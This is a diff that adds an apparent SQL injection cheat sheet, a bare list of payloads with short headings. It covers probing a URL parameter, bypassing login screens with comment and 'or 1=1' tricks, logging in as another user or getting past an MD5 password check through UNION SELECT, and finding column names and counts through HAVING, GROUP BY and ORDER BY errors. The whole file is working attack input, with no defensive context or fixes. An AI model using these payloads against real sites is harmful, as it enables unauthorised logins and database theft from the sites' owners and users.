@@ -1,0 +1,40 @@
+check if vulenrable
+---------------------------------
+put a '
+play with parameter : product.php?id=1+5
+product.php?id=4 OR 1=1
+
+
+Bypassing Login Screens (SMO+)
+----------------------------------------
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+....
+Login as different user (SM*) 
+' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
+
+Bypassing second MD5 hash check login screens
+-------------------------------------------------------------
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+
+Finding Column Names with HAVING BY - Error Based (S)
+------------------------------------------
+' HAVING 1=1 --
+' GROUP BY table.columnfromerror1 HAVING 1=1 --
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- and so on
+
+Finding how many columns in SELECT query by ORDER BY (MSO+)
+------------------------------------------
+ORDER BY 1--
+ORDER BY 2--
+ORDER BY N-- so on
+
+
+
